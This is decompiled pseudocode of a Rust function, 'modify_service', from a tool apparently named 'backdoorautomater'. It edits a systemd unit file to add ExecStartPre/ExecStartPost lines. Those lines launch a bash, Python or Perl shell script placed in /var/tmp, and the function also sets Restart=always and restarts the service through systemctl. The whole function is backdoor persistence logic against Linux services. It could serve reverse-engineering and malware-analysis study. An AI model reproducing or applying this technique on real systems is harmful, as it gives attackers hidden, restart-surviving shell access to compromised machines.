__int64 __fastcall backdoorautomater::modifyservice::modify_service(
        __int128 *a1,
        __int128 *a2,
        unsigned __int8 a3,
        __int64 a4,
        __int128 *a5,
        __int128 *a6)
{
  int v6; // ebp
  __int64 v7; // r13
  __int128 v9; // rax
  __int64 v10; // rax
  __int64 v11; // rbx
  int v12; // eax
  __int128 *v13; // r12
  __int64 v14; // rcx
  __int64 v15; // rdx
  unsigned __int64 v16; // r14
  __int64 v17; // r15
  __int64 v18; // rax
  __int64 v19; // rdx
  __int64 v20; // rcx
  __int64 v21; // rax
  __int64 v22; // rdx
  unsigned __int64 v23; // rbx
  __int64 v24; // rax
  __int64 v25; // rdx
  unsigned __int64 v26; // rbx
  __int128 v27; // xmm0
  __int64 v28; // rax
  __int64 v29; // rax
  __int128 v30; // xmm0
  __int128 v31; // rax
  __int64 v32; // rax
  __int64 v33; // rbx
  __int64 v34; // rax
  __int64 v35; // rax
  __int64 v36; // rax
  __int64 v37; // rax
  __int64 v38; // rdx
  __int64 v39; // rax
  __int64 v40; // rax
  __int64 v41; // rax
  __int64 v42; // rdx
  __int64 v43; // rbp
  __int64 i; // rsi
  __int64 v45; // rax
  __int64 v46; // rdx
  __int64 v47; // rax
  __int64 v48; // rdx
  __int64 v49; // rax
  __int64 v50; // rdx
  __int64 v51; // r14
  char v52; // r12
  __int64 v53; // rax
  __int64 v54; // rax
  __int64 v55; // rax
  __int64 v56; // rdx
  char v58; // [rsp+1Ch] [rbp-36Ch]
  __int128 v59; // [rsp+20h] [rbp-368h] BYREF
  __int64 v60; // [rsp+30h] [rbp-358h]
  __int128 v61; // [rsp+60h] [rbp-328h] BYREF
  __int128 v62; // [rsp+70h] [rbp-318h]
  __int128 v63; // [rsp+80h] [rbp-308h]
  __int64 v64; // [rsp+90h] [rbp-2F8h]
  __int128 v65; // [rsp+A0h] [rbp-2E8h] BYREF
  __int64 v66; // [rsp+B0h] [rbp-2D8h]
  int v67; // [rsp+C0h] [rbp-2C8h]
  int v68; // [rsp+C4h] [rbp-2C4h]
  __int128 *v69; // [rsp+C8h] [rbp-2C0h]
  __int128 *v70; // [rsp+D0h] [rbp-2B8h]
  __int64 v71; // [rsp+D8h] [rbp-2B0h]
  __int128 v72; // [rsp+E0h] [rbp-2A8h] BYREF
  __int64 v73; // [rsp+F0h] [rbp-298h]
  __int128 v74; // [rsp+100h] [rbp-288h] BYREF
  _BYTE v75[24]; // [rsp+110h] [rbp-278h]
  __int128 v76; // [rsp+1D0h] [rbp-1B8h] BYREF
  __int128 v77; // [rsp+1E0h] [rbp-1A8h]
  __int128 v78; // [rsp+1F0h] [rbp-198h]
  __int64 v79; // [rsp+200h] [rbp-188h]
  __int128 v80; // [rsp+210h] [rbp-178h] BYREF
  __int64 v81; // [rsp+220h] [rbp-168h]
  __int128 v82; // [rsp+230h] [rbp-158h] BYREF
  __int64 v83; // [rsp+240h] [rbp-148h]
  __int128 *v84; // [rsp+248h] [rbp-140h]
  int v85; // [rsp+254h] [rbp-134h]
  __int128 *v86; // [rsp+258h] [rbp-130h]
  __int128 v87; // [rsp+260h] [rbp-128h] BYREF
  __int64 v88; // [rsp+270h] [rbp-118h]
  __int128 v89; // [rsp+280h] [rbp-108h] BYREF
  __int64 v90; // [rsp+290h] [rbp-F8h]
  __int128 v91; // [rsp+2A0h] [rbp-E8h] BYREF
  __int64 v92; // [rsp+2B0h] [rbp-D8h]
  _BYTE v93[24]; // [rsp+2C0h] [rbp-C8h] BYREF
  char v94[8]; // [rsp+2D8h] [rbp-B0h] BYREF
  __int128 v95; // [rsp+2E0h] [rbp-A8h]
  _QWORD v96[2]; // [rsp+2F0h] [rbp-98h] BYREF
  __int128 v97; // [rsp+300h] [rbp-88h] BYREF
  __int64 v98; // [rsp+310h] [rbp-78h]
  __int128 v99; // [rsp+320h] [rbp-68h] BYREF
  __int64 v100; // [rsp+330h] [rbp-58h]
  __int128 v101; // [rsp+340h] [rbp-48h] BYREF
  __int64 v102; // [rsp+350h] [rbp-38h]

  v69 = a5;
  v7 = a4;
  v86 = a2;
  v84 = a1;
  v70 = a6;
  v71 = a4;
  <alloc::string::String as core::clone::Clone>::clone(v93, a6);
  *(_QWORD *)&v65 = 0LL;
  *((_QWORD *)&v65 + 1) = 1LL;
  v66 = 0LL;
  <T as alloc::slice::hack::ConvertVec>::to_vec(&v74, aExecstartpreBi, 26LL);
  v88 = *(_QWORD *)v75;
  v87 = v74;
  *(_QWORD *)&v9 = <&alloc::vec::Vec<T,A> as core::iter::traits::collect::IntoIterator>::into_iter(v7);
  v76 = v9;
  v10 = <core::slice::iter::Iter<T> as core::iter::traits::iterator::Iterator>::next(&v76);
  if ( v10 )
  {
    v11 = 1LL;
    while ( !(unsigned __int8)<&str as core::str::pattern::Pattern>::is_contained_in(
                                *(_QWORD *)(v10 + 8),
                                *(_QWORD *)(v10 + 16)) )
    {
      v10 = <core::slice::iter::Iter<T> as core::iter::traits::iterator::Iterator>::next(&v76);
      ++v11;
      if ( !v10 )
        goto LABEL_5;
    }
    switch ( a3 )
    {
      case 1u:
        v27 = *(__int128 *)((char *)v69 + 8);
        *(_QWORD *)&v74 = aExecstartpostN;
        *((_QWORD *)&v74 + 1) = 17LL;
        *(_OWORD *)v75 = v27;
        alloc::str::join_generic_copy(&v59, &v74, 2LL, 1LL, 0LL);
        *(_QWORD *)&v62 = v60;
        v61 = v59;
        alloc::vec::Vec<T,A>::extend_from_slice(&v61, asc_165677, 1LL);
        alloc::vec::Vec<T,A>::extend_from_slice(&v61, *((_QWORD *)v70 + 1), *((_QWORD *)v70 + 2));
        alloc::vec::Vec<T,A>::extend_from_slice(&v61, aEBinBash, 13LL);
        <alloc::string::String as core::clone::Clone>::clone(&v74, &v61);
        core::ptr::drop_in_place<alloc::string::String>(&v65);
        v66 = *(_QWORD *)v75;
        v65 = v74;
        core::ptr::drop_in_place<alloc::string::String>(&v61);
        v58 = 0;
        goto LABEL_7;
      case 2u:
        v30 = *(__int128 *)((char *)v69 + 8);
        *(_QWORD *)&v74 = aExecstartpreBi_0;
        *((_QWORD *)&v74 + 1) = 47LL;
        *(_OWORD *)v75 = v30;
        alloc::str::join_generic_copy(&v59, &v74, 2LL, 1LL, 0LL);
        *(_QWORD *)&v62 = v60;
        v61 = v59;
        alloc::vec::Vec<T,A>::extend_from_slice(&v61, asc_165685, 1LL);
        alloc::vec::Vec<T,A>::extend_from_slice(&v61, *((_QWORD *)v70 + 1), *((_QWORD *)v70 + 2));
        alloc::vec::Vec<T,A>::extend_from_slice(&v61, a01, 8LL);
        *(_QWORD *)v75 = v62;
        v74 = v61;
        alloc::vec::Vec<T,A>::insert(v7, v11, &v74);
        <T as alloc::slice::hack::ConvertVec>::to_vec(&v74, aRestartAlways, 15LL);
        v98 = *(_QWORD *)v75;
        v97 = v74;
        alloc::vec::Vec<T,A>::insert(v7, v11, &v97);
        v58 = 0;
        goto LABEL_26;
      case 3u:
        v60 = *((_QWORD *)v70 + 2);
        v59 = *v70;
        *(_QWORD *)v75 = *((_QWORD *)v69 + 2);
        v74 = *v69;
        v28 = backdoorautomater::modifyservice::write_shell_pyfile(&v59, &v74);
        backdoorautomater::sanitizer::sanitize_return_fn(v28);
        *(_QWORD *)&v74 = aExecstartpost;
        *((_QWORD *)&v74 + 1) = 14LL;
        *(_QWORD *)v75 = aPythonVarTmpSh;
        *(_QWORD *)&v75[8] = 25LL;
        alloc::str::join_generic_copy(&v59, &v74, 2LL, 1LL, 0LL);
        *(_QWORD *)&v62 = v60;
        v61 = v59;
        alloc::vec::Vec<T,A>::extend_from_slice(&v61, asc_165765, 1LL);
        <alloc::string::String as core::clone::Clone>::clone(&v74, &v61);
        core::ptr::drop_in_place<alloc::string::String>(&v65);
        v66 = *(_QWORD *)v75;
        v65 = v74;
        core::ptr::drop_in_place<alloc::string::String>(&v61);
        break;
      case 4u:
        v60 = *((_QWORD *)v70 + 2);
        v59 = *v70;
        *(_QWORD *)v75 = *((_QWORD *)v69 + 2);
        v74 = *v69;
        v29 = backdoorautomater::modifyservice::write_shell_perl(&v59, &v74);
        backdoorautomater::sanitizer::sanitize_return_fn(v29);
        *(_QWORD *)&v74 = aExecstartpost;
        *((_QWORD *)&v74 + 1) = 14LL;
        *(_QWORD *)v75 = aPerlVarTmpShel;
        *(_QWORD *)&v75[8] = 23LL;
        alloc::str::join_generic_copy(&v59, &v74, 2LL, 1LL, 0LL);
        *(_QWORD *)&v62 = v60;
        v61 = v59;
        alloc::vec::Vec<T,A>::extend_from_slice(&v61, asc_165765, 1LL);
        <alloc::string::String as core::clone::Clone>::clone(&v74, &v61);
        core::ptr::drop_in_place<alloc::string::String>(&v65);
        v66 = *(_QWORD *)v75;
        v65 = v74;
        core::ptr::drop_in_place<alloc::string::String>(&v61);
        break;
      default:
        goto LABEL_5;
    }
    v58 = 1;
  }
  else
  {
LABEL_5:
    v58 = 0;
    if ( a3 > 4u )
    {
LABEL_26:
      LODWORD(v13) = 0;
      goto LABEL_27;
    }
    v12 = 26;
    LODWORD(v13) = 0;
    if ( !_bittest(&v12, a3) )
      goto LABEL_27;
  }
LABEL_7:
  v14 = *(_QWORD *)(v7 + 8) + 24LL * *(_QWORD *)(v7 + 16);
  *(_QWORD *)&v74 = *(_QWORD *)(v7 + 8);
  *((_QWORD *)&v74 + 1) = v14;
  *(_QWORD *)v75 = 0LL;
  do
  {
    v16 = <core::iter::adapters::enumerate::Enumerate<I> as core::iter::traits::iterator::Iterator>::next(&v74);
    v17 = v15;
    if ( !v15 )
      break;
    v18 = core::str::<impl str>::trim_matches(*(_QWORD *)(v15 + 8), *(_QWORD *)(v15 + 16));
  }
  while ( !(unsigned __int8)<[A] as core::slice::cmp::SlicePartialEq<B>>::equal(v18, v19, aService, 9LL) );
  v20 = *(_QWORD *)(v7 + 8) + 24LL * *(_QWORD *)(v7 + 16);
  *(_QWORD *)&v74 = *(_QWORD *)(v7 + 8);
  *((_QWORD *)&v74 + 1) = v20;
  *(_QWORD *)v75 = 0LL;
  v13 = &v74;
  do
  {
    v21 = <core::iter::adapters::enumerate::Enumerate<I> as core::iter::traits::iterator::Iterator>::next(&v74);
    if ( !v22 )
    {
      LODWORD(v13) = 0;
      v7 = v71;
      goto LABEL_27;
    }
    v23 = v21;
    v24 = core::str::<impl str>::trim_matches(*(_QWORD *)(v22 + 8), *(_QWORD *)(v22 + 16));
  }
  while ( !(unsigned __int8)<[A] as core::slice::cmp::SlicePartialEq<B>>::equal(v24, v25, &unk_165766, 9LL) );
  if ( v17 )
  {
    v7 = v71;
    if ( v23 <= v16 )
    {
      *(_QWORD *)v75 = v66;
      v74 = v65;
      alloc::vec::Vec<T,A>::push(v71, &v74);
      <T as alloc::slice::hack::ConvertVec>::to_vec(&v74, aRestartAlways, 15LL);
      v102 = *(_QWORD *)v75;
      v101 = v74;
      alloc::vec::Vec<T,A>::push(v7, &v101);
    }
    else
    {
      v26 = v23 - 1;
      *(_QWORD *)v75 = v66;
      v74 = v65;
      alloc::vec::Vec<T,A>::insert(v71, v26, &v74);
      <T as alloc::slice::hack::ConvertVec>::to_vec(&v74, aRestartAlways, 15LL);
      v100 = *(_QWORD *)v75;
      v99 = v74;
      alloc::vec::Vec<T,A>::insert(v7, v26, &v99);
    }
    LOBYTE(v13) = 1;
  }
  else
  {
    LODWORD(v13) = 0;
    v7 = v71;
  }
LABEL_27:
  *(_QWORD *)&v31 = <&alloc::vec::Vec<T,A> as core::iter::traits::collect::IntoIterator>::into_iter(v7);
  v59 = v31;
  v32 = <core::slice::iter::Iter<T> as core::iter::traits::iterator::Iterator>::next(&v59);
  LOBYTE(v6) = 1;
  if ( v32 )
  {
    v33 = 1LL;
    while ( !(unsigned __int8)<&str as core::str::pattern::Pattern>::is_contained_in(
                                *(_QWORD *)(v32 + 8),
                                *(_QWORD *)(v32 + 16)) )
    {
      v32 = <core::slice::iter::Iter<T> as core::iter::traits::iterator::Iterator>::next(&v59);
      ++v33;
      if ( !v32 )
      {
        v67 = 1;
        LOBYTE(v6) = 1;
        goto LABEL_34;
      }
    }
    *(_QWORD *)v75 = v88;
    v74 = v87;
    alloc::vec::Vec<T,A>::insert(v7, v33, &v74);
    v67 = 0;
    v6 = 0;
  }
  else
  {
    v67 = 1;
  }
LABEL_34:
  <alloc::string::String as core::clone::Clone>::clone(v94, v84);
  v60 = *((_QWORD *)v84 + 2);
  v59 = *v84;
  *(_QWORD *)v75 = *((_QWORD *)v86 + 2);
  v74 = *v86;
  v68 = v6;
  v34 = backdoorautomater::modifyservice::write_service(&v59, &v74, v7);
  backdoorautomater::sanitizer::sanitize_return_fn(v34);
  v96[0] = aSystemctlDaemo;
  v96[1] = 23LL;
  std::process::Command::new(&v74, aSh, 2LL);
  v35 = std::process::Command::arg(&v74, aC_1, 2LL);
  v36 = std::process::Command::arg(v35, v96);
  std::process::Command::output(&v59, v36);
  core::result::Result<T,E>::expect(&v76, &v59, &off_229E70);
  core::ptr::drop_in_place<std::process::Command>(&v74);
  alloc::string::String::from_utf8_lossy(&v59, v78, *((_QWORD *)&v78 + 1));
  v37 = <alloc::borrow::Cow<B> as core::ops::deref::Deref>::deref(&v59);
  <T as alloc::slice::hack::ConvertVec>::to_vec(&v74, v37, v38);
  v73 = *(_QWORD *)v75;
  v72 = v74;
  core::ptr::drop_in_place<alloc::borrow::Cow<str>>(&v59);
  backdoorautomater::sanitizer::sanitize_system_command(&v72);
  *(_QWORD *)&v74 = aSystemctlStop;
  *((_QWORD *)&v74 + 1) = 15LL;
  *(_OWORD *)v75 = v95;
  alloc::str::join_generic_copy(&v59, &v74, 2LL, 1LL, 0LL);
  v90 = v60;
  v89 = v59;
  std::process::Command::new(&v74, aSh, 2LL);
  v39 = std::process::Command::arg(&v74, aC_1, 2LL);
  v40 = std::process::Command::arg(v39, &v89);
  std::process::Command::output(&v59, v40);
  core::result::Result<T,E>::expect(&v61, &v59, &off_229E88);
  core::ptr::drop_in_place<std::process::Output>(&v76);
  v79 = v64;
  v78 = v63;
  v77 = v62;
  v76 = v61;
  core::ptr::drop_in_place<std::process::Command>(&v74);
  alloc::string::String::from_utf8_lossy(&v59, v78, *((_QWORD *)&v78 + 1));
  v41 = <alloc::borrow::Cow<B> as core::ops::deref::Deref>::deref(&v59);
  <T as alloc::slice::hack::ConvertVec>::to_vec(&v74, v41, v42);
  *(_QWORD *)&v62 = *(_QWORD *)v75;
  v61 = v74;
  core::ptr::drop_in_place<alloc::string::String>(&v72);
  v73 = v62;
  v72 = v61;
  core::ptr::drop_in_place<alloc::borrow::Cow<str>>(&v59);
  backdoorautomater::sanitizer::sanitize_system_command(&v72);
  *(_QWORD *)&v74 = aSystemctlStart;
  *((_QWORD *)&v74 + 1) = 16LL;
  *(_OWORD *)v75 = v95;
  v43 = 1LL;
  alloc::str::join_generic_copy(&v59, &v74, 2LL, 1LL, 0LL);
  v85 = (int)v13;
  v92 = v60;
  v91 = v59;
  *(_QWORD *)&v80 = 0LL;
  *((_QWORD *)&v80 + 1) = 1LL;
  v81 = 0LL;
  *(_QWORD *)&v82 = 0LL;
  *((_QWORD *)&v82 + 1) = 1LL;
  v83 = 0LL;
  for ( i = 0LL; ; i = v83 )
  {
    v45 = <alloc::string::String as core::ops::index::Index<I>>::index(v43, i);
    if ( (unsigned __int8)<[A] as core::slice::cmp::SlicePartialEq<B>>::equal(v45, v46, aOk, 2LL) )
      break;
    *(_QWORD *)&v74 = &off_229F08;
    *((_QWORD *)&v74 + 1) = 1LL;
    *(_QWORD *)v75 = 8LL;
    *(_OWORD *)&v75[8] = 0LL;
    std::io::stdio::_print(&v74);
    *(_QWORD *)&v59 = v93;
    *((_QWORD *)&v59 + 1) = <alloc::string::String as core::fmt::Display>::fmt;
    *(_QWORD *)&v74 = &off_229F18;
    *((_QWORD *)&v74 + 1) = 2LL;
    *(_QWORD *)&v75[16] = 0LL;
    *(_QWORD *)v75 = &v59;
    *(_QWORD *)&v75[8] = 1LL;
    std::io::stdio::_print(&v74);
    *(_QWORD *)&v74 = &off_229F38;
    *((_QWORD *)&v74 + 1) = 1LL;
    *(_QWORD *)v75 = 8LL;
    *(_OWORD *)&v75[8] = 0LL;
    std::io::stdio::_print(&v74);
    *(_QWORD *)&v74 = std::io::stdio::stdin();
    v47 = std::io::stdio::Stdin::read_line(&v74, &v80);
    core::result::Result<T,E>::expect(v47, v48);
    v49 = core::str::<impl str>::trim_end_matches(*((_QWORD *)&v80 + 1), v81, 10LL);
    <T as alloc::slice::hack::ConvertVec>::to_vec(&v74, v49, v50);
    v60 = *(_QWORD *)v75;
    v59 = v74;
    core::ptr::drop_in_place<alloc::string::String>(&v80);
    v81 = v60;
    v80 = v59;
    <alloc::string::String as core::clone::Clone>::clone(&v74, &v80);
    core::ptr::drop_in_place<alloc::string::String>(&v82);
    v83 = *(_QWORD *)v75;
    v82 = v74;
    alloc::vec::Vec<T,A>::clear(&v80);
    v43 = *((_QWORD *)&v82 + 1);
  }
  *(_QWORD *)&v74 = &off_229EA0;
  *((_QWORD *)&v74 + 1) = 1LL;
  *(_QWORD *)v75 = 8LL;
  *(_OWORD *)&v75[8] = 0LL;
  v51 = v71;
  std::io::stdio::_print(&v74);
  v52 = v85;
  std::process::Command::new(&v74, aSh, 2LL);
  v53 = std::process::Command::arg(&v74, aC_1, 2LL);
  v54 = std::process::Command::arg(v53, &v91);
  std::process::Command::output(&v59, v54);
  core::result::Result<T,E>::expect(&v61, &v59, &off_229EB0);
  core::ptr::drop_in_place<std::process::Output>(&v76);
  v79 = v64;
  v78 = v63;
  v77 = v62;
  v76 = v61;
  core::ptr::drop_in_place<std::process::Command>(&v74);
  alloc::string::String::from_utf8_lossy(&v59, v78, *((_QWORD *)&v78 + 1));
  v55 = <alloc::borrow::Cow<B> as core::ops::deref::Deref>::deref(&v59);
  <T as alloc::slice::hack::ConvertVec>::to_vec(&v74, v55, v56);
  *(_QWORD *)&v62 = *(_QWORD *)v75;
  v61 = v74;
  core::ptr::drop_in_place<alloc::string::String>(&v72);
  v73 = v62;
  v72 = v61;
  core::ptr::drop_in_place<alloc::borrow::Cow<str>>(&v59);
  backdoorautomater::sanitizer::sanitize_ex_stderr(&v72);
  *(_QWORD *)&v74 = &off_229EC8;
  *((_QWORD *)&v74 + 1) = 1LL;
  *(_QWORD *)v75 = 8LL;
  *(_OWORD *)&v75[8] = 0LL;
  std::io::stdio::_print(&v74);
  *(_QWORD *)&v59 = v93;
  *((_QWORD *)&v59 + 1) = <alloc::string::String as core::fmt::Display>::fmt;
  *(_QWORD *)&v74 = &off_229ED8;
  *((_QWORD *)&v74 + 1) = 2LL;
  *(_QWORD *)&v75[16] = 0LL;
  *(_QWORD *)v75 = &v59;
  *(_QWORD *)&v75[8] = 1LL;
  std::io::stdio::_print(&v74);
  *(_QWORD *)&v74 = &off_229EF8;
  *((_QWORD *)&v74 + 1) = 1LL;
  *(_QWORD *)v75 = 8LL;
  *(_OWORD *)&v75[8] = 0LL;
  std::io::stdio::_print(&v74);
  core::ptr::drop_in_place<alloc::string::String>(&v82);
  core::ptr::drop_in_place<alloc::string::String>(&v80);
  core::ptr::drop_in_place<alloc::string::String>(&v91);
  core::ptr::drop_in_place<alloc::string::String>(&v89);
  core::ptr::drop_in_place<alloc::string::String>(&v72);
  core::ptr::drop_in_place<std::process::Output>(&v76);
  core::ptr::drop_in_place<alloc::string::String>(v94);
  if ( (_BYTE)v67 )
    core::ptr::drop_in_place<alloc::string::String>(&v87);
  if ( !v52 )
    core::ptr::drop_in_place<alloc::string::String>(&v65);
  core::ptr::drop_in_place<alloc::string::String>(v93);
  if ( !v58 )
  {
    core::ptr::drop_in_place<alloc::string::String>(v70);
    core::ptr::drop_in_place<alloc::string::String>(v69);
  }
  return core::ptr::drop_in_place<alloc::vec::Vec<alloc::string::String>>(v51);
}